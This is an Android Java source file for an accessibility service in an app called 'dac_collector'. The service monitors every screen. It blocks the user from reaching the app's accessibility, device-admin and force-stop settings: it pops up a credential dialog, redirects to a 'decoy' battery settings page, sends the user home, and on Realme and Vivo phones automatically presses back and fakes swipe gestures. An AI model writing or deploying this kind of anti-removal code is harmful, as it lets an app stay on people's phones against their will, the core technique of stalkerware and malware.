package android.iocl.dac_collector.Services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Path;
import android.iocl.dac_collector.R;
import android.iocl.dac_collector.Ui.AccessibilitySettingsDialogActivity;
import android.iocl.dac_collector.Utility.SharedPrefs;
import android.iocl.dac_collector.Utility.WakeupHelper;
import android.os.Build;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import androidx.annotation.RequiresApi;

import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

public class AcessibilitySettings extends AccessibilityService {
    public static final String CUSTOM_ACTION = "com.example.mybroadcastapp.CUSTOM_ACTION";
    private static final String TAG = "AccessibilitySettings";

    // State Flags
    private boolean ownAccessibilitySettingsVisitActive;
    private boolean ownDeviceAdminSettingsVisitActive;
    private boolean confirmationFlowActive;
    private boolean confirmationShownForCurrentVisit;
    private boolean movingUserHome;
    private boolean receiverRegistered = false;
    private boolean inDecoyPhase; // True when user is in the 'decoy' settings

    // Decoy Settings URIs
    private static final String DECOY_BATTERY_URI = "android.settings.BATTERY_SAVER_SETTINGS";
    private static final String DECOY_LOCATION_URI = "android.settings.LOCATION_SETTINGS";

    private final BroadcastReceiver receiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (CUSTOM_ACTION.equals(intent.getAction())) {
                // External trigger to force back/home
                forceExitSequence();
            } else if (AccessibilitySettingsDialogActivity.ACTION_CONFIRMATION_FINISHED.equals(intent.getAction())) {
                handleConfirmationFinished(intent);
            }
        }
    };

    // Handler Interface for brand-specific quirks
    public interface AccessibilityHandler {
        void handleEvent(AccessibilityService service, AccessibilityEvent event);
    }

    private final Map<String, AccessibilityHandler> handlerMap = new HashMap<>();

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        WakeupHelper.wakeupAppService(getApplicationContext());

        // Register brand handlers
        handlerMap.put("realme", this::handleRealmeVivo);
        handlerMap.put("vivo", this::handleRealmeVivo);
        handlerMap.put("iqoo", this::handleRealmeVivo);
        handlerMap.put("samsung", this::handleSamsung);

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        info.notificationTimeout = 0;
        setServiceInfo(info);

        registerReceiverSafely();
        Log.d(TAG, "Service Connected");
    }

    private void registerReceiverSafely() {
        if (receiverRegistered) return;
        try {
            IntentFilter filter = new IntentFilter(CUSTOM_ACTION);
            filter.addAction(AccessibilitySettingsDialogActivity.ACTION_CONFIRMATION_FINISHED);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(receiver, filter, Context.RECEIVER_EXPORTED);
            } else {
                registerReceiver(receiver, filter);
            }
            receiverRegistered = true;
        } catch (RuntimeException e) {
            receiverRegistered = false;
            Log.e(TAG, "Failed to register receiver", e);
        }
    }

    private void unregisterReceiverSafely() {
        if (!receiverRegistered) return;
        try {
            unregisterReceiver(receiver);
        } catch (RuntimeException e) {
            Log.w(TAG, "unregisterReceiver failed", e);
        } finally {
            receiverRegistered = false;
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        int eventType = event.getEventType();
        if (eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            return;
        }

        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
        String cls = event.getClassName() != null ? event.getClassName().toString() : "";

        // 1. If our Dialog is open, ignore everything else to prevent interference
        if (isConfirmationActivityOpen(event)) {
            return;
        }

        // 2. If we are in the "Decoy" phase (Battery/Location), just ensure we stay there
        //    or let the user interact normally until they try to leave.
        if (inDecoyPhase) {
            // If the user navigates away from the decoy settings, we might want to re-enter or just let them go.
            // For simplicity, if they leave the decoy settings, we reset the decoy flag.
            if (!isSettingsWindow(pkg)) {
                inDecoyPhase = false;
            }
            return;
        }

        // 3. Check if we are on our OWN Accessibility Settings or Device Admin page
        boolean isOwnAccessibilityPage = isOwnAccessibilitySettingsOpen(event);
        boolean isOwnDeviceAdminPage = isOwnDeviceAdminSettingsOpen(event);

        if (isOwnAccessibilityPage || isOwnDeviceAdminPage) {
            boolean isDeviceAdmin = isOwnDeviceAdminPage;

            // Initialize visit state
            if (isDeviceAdmin && !ownDeviceAdminSettingsVisitActive) {
                Log.d(TAG, "=== NEW DEVICE ADMIN VISIT ===");
                ownDeviceAdminSettingsVisitActive = true;
                ownAccessibilitySettingsVisitActive = false;
                confirmationShownForCurrentVisit = false;
            } else if (!isDeviceAdmin && !ownAccessibilitySettingsVisitActive) {
                Log.d(TAG, "=== NEW ACCESSIBILITY VISIT ===");
                ownAccessibilitySettingsVisitActive = true;
                ownDeviceAdminSettingsVisitActive = false;
                confirmationShownForCurrentVisit = false;
            }

            // Trigger Confirmation Dialog if not already shown
            if (!confirmationFlowActive && !confirmationShownForCurrentVisit) {
                confirmationFlowActive = true;
                confirmationShownForCurrentVisit = true;
                showAccessibilitySettingsDialog(isDeviceAdmin);
            }
            
            return; // Stop further processing; we are in protected zone
        }

        // 4. If we were in a visit, but now we are NOT on our page:
        //    The user tried to leave (Back button or navigation).
        if (ownAccessibilitySettingsVisitActive || ownDeviceAdminSettingsVisitActive) {
            Log.d(TAG, "=== LEAVING PROTECTED SETTINGS ===");
            
            // Reset visit state
            ownAccessibilitySettingsVisitActive = false;
            ownDeviceAdminSettingsVisitActive = false;
            confirmationShownForCurrentVisit = false;
            confirmationFlowActive = false;

            // If the confirmation flow was active but user left without finishing, 
            // we treat it as a "dismissed" flow and redirect to decoy.
            redirectToDecoyAndHome();
            return;
        }

        // 5. If we are just browsing other settings (not ours), apply brand-specific guards
        if (!SharedPrefs.isRestrictionEnabled() || !SharedPrefs.isForceAccessibilityEnabled()) {
            return;
        }

        String brand = Build.BRAND.toLowerCase(Locale.US);
        AccessibilityHandler handler = handlerMap.get(brand);
        if (handler != null) {
            handler.handleEvent(this, event);
        }
    }

    // --- Core Logic: Confirmation Finished Handler ---

    private void handleConfirmationFinished(Intent intent) {
        boolean returnedToHome = intent.getBooleanExtra(AccessibilitySettingsDialogActivity.EXTRA_RETURNED_TO_HOME, false);
        boolean retryConfirmation = intent.getBooleanExtra(AccessibilitySettingsDialogActivity.EXTRA_RETRY_CONFIRMATION, false);

        Log.d(TAG, "Confirmation finished. home=" + returnedToHome + ", retry=" + retryConfirmation);

        // Reset flow state
        confirmationFlowActive = false;
        confirmationShownForCurrentVisit = false;
        ownAccessibilitySettingsVisitActive = false;
        ownDeviceAdminSettingsVisitActive = false;

        if (returnedToHome) {
            // User completed the flow successfully and wants to go home.
            // We still redirect to decoy first as per requirements, then home.
            redirectToDecoyAndHome();
        } else if (retryConfirmation) {
            // User dismissed dialog to retry. We stay on the current page (which is still protected).
            // No action needed, the next event will re-trigger the dialog if they are still on the page.
            Log.d(TAG, "Retry requested. Staying on current page.");
        } else {
            // User just closed the dialog without explicit home/retry.
            // Treat as leaving the flow.
            redirectToDecoyAndHome();
        }
    }

    // --- Core Logic: Decoy Redirection ---

    private void redirectToDecoyAndHome() {
        // 1. Launch Decoy Settings (e.g., Battery)
        try {
            Intent decoyIntent = new Intent();
            // Alternate between Battery and Location for variety or stick to one
            // Let's use Battery Saver as it's a common deep link
            decoyIntent.setAction(DECOY_BATTERY_URI);
            decoyIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            
            // Verify resolution
            if (decoyIntent.resolveActivity(getPackageManager()) != null) {
                startActivity(decoyIntent);
                inDecoyPhase = true;
                Log.d(TAG, "Redirected to Decoy Settings (Battery)");
            } else {
                // Fallback to general settings if specific deep link fails
                decoyIntent.setAction(android.provider.Settings.ACTION_SETTINGS);
                startActivity(decoyIntent);
                inDecoyPhase = true;
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to start decoy settings", e);
        }

        // 2. Move to Home
        // We delay slightly to ensure the decoy window is focused before going home
        // However, GLOBAL_ACTION_HOME is immediate. 
        // To make it seamless: 
        // 1. Start Decoy
        // 2. Perform Home
        
        // Note: If we perform Home immediately, the Decoy might not render.
        // A better approach for "redirect then home" is often just going Home 
        // and letting the user see the app launcher, but the prompt implies 
        // showing the setting first.
        
        // Since performGlobalAction is synchronous in terms of intent dispatch,
        // let's schedule the home action slightly after the start activity.
        
        new android.os.Handler(getMainLooper()).postDelayed(() -> {
            if (!movingUserHome) {
                moveUserHome();
            }
        }, 500); // 500ms delay to let the decoy window appear
    }

    private void forceExitSequence() {
        // If triggered by custom action, force immediate exit
        inDecoyPhase = false;
        moveUserHome();
    }

    // --- Detection Helpers ---

    private boolean isOwnAccessibilitySettingsOpen(AccessibilityEvent event) {
        if (!isSettingsWindow(event.getPackageName())) return false;

        String appName = getAppName();
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return false;

        try {
            return containsTextRecursive(root, appName);
        } finally {
            root.recycle();
        }
    }

    private boolean isOwnDeviceAdminSettingsOpen(AccessibilityEvent event) {
        if (!isSettingsWindow(event.getPackageName())) return false;

        String appName = getAppName();
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return false;

        try {
            boolean hasApp = containsTextRecursive(root, appName);
            boolean hasAdmin = containsTextRecursive(root, "admin") || containsTextRecursive(root, "administrator");
            return hasApp && hasAdmin;
        } finally {
            root.recycle();
        }
    }

    private boolean isConfirmationActivityOpen(AccessibilityEvent event) {
        if (event == null) return false;
        CharSequence pkg = event.getPackageName();
        CharSequence cls = event.getClassName();
        return TextUtils.equals(getPackageName(), pkg)
                && TextUtils.equals(AccessibilitySettingsDialogActivity.class.getName(), cls);
    }

    private boolean isSettingsWindow(CharSequence packageName) {
        return packageName != null && packageName.toString().toLowerCase(Locale.US).contains("settings");
    }

    private String getAppName() {
        try {
            return getApplicationInfo().loadLabel(getPackageManager()).toString().toLowerCase(Locale.US);
        } catch (Exception e) {
            return "dac_collector";
        }
    }

    private boolean containsTextRecursive(AccessibilityNodeInfo node, String target) {
        if (node == null || TextUtils.isEmpty(target)) return false;
        target = target.toLowerCase(Locale.US);

        CharSequence text = node.getText();
        CharSequence desc = node.getContentDescription();

        if (text != null && text.toString().toLowerCase(Locale.US).contains(target)) return true;
        if (desc != null && desc.toString().toLowerCase(Locale.US).contains(target)) return true;

        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                try {
                    if (containsTextRecursive(child, target)) return true;
                } finally {
                    child.recycle();
                }
            }
        }
        return false;
    }

    // --- UI Actions ---

    private void moveUserHome() {
        movingUserHome = true;
        if (!performGlobalAction(GLOBAL_ACTION_HOME)) {
            Intent homeIntent = new Intent(Intent.ACTION_MAIN)
                    .addCategory(Intent.CATEGORY_HOME)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(homeIntent);
        }
        // Reset moving flag after a short delay to prevent immediate re-trigger if event loops
        new android.os.Handler(getMainLooper()).postDelayed(() -> movingUserHome = false, 1000);
    }

    private void showAccessibilitySettingsDialog(boolean forDeviceAdmin) {
        try {
            Intent intent = new Intent(this, AccessibilitySettingsDialogActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
            intent.putExtra(AccessibilitySettingsDialogActivity.EXTRA_REQUIRE_CREDENTIAL, forDeviceAdmin);
            startActivity(intent);
            Log.i(TAG, "Opened confirmation dialog");
        } catch (RuntimeException e) {
            confirmationFlowActive = false;
            Log.e(TAG, "Failed to open dialog", e);
        }
    }

    // --- Brand Specific Handlers ---

    private void handleRealmeVivo(AccessibilityService service, AccessibilityEvent event) {
        String text = event.getText() != null ? event.getText().toString().toLowerCase(Locale.US) : "";
        String cls = event.getClassName() != null ? event.getClassName().toString().toLowerCase(Locale.US) : "";
        
        if (cls.contains("notification")) return;
        if (cls.contains("android.iocl.dac_collector")) return;

        boolean appNameMatch = text.contains(getAppName());
        boolean accessibilityMatch = text.contains("accessibility");
        boolean forceStopMatch = text.contains("force stop");
        
        if ((appNameMatch || accessibilityMatch || forceStopMatch) && !text.contains("volume")) {
            performGlobalAction(GLOBAL_ACTION_BACK);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                simulateBackGesture();
            }
        }
    }

    private void handleSamsung(AccessibilityService service, AccessibilityEvent event) {
        // Samsung specific logic
    }

    @RequiresApi(api = Build.VERSION_CODES.N)
    public void simulateBackGesture() {
        Path path = new Path();
        path.moveTo(1000, 2000);
        path.lineTo(100, 2000);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        GestureDescription description = builder
                .addStroke(new GestureDescription.StrokeDescription(path, 0, 200))
                .build();
        dispatchGesture(description, null, null);
    }

    @Override
    public void onInterrupt() {
        // Do nothing, keep receiver alive
    }

    @Override
    public void onDestroy() {
        unregisterReceiverSafely();
        super.onDestroy();
    }
}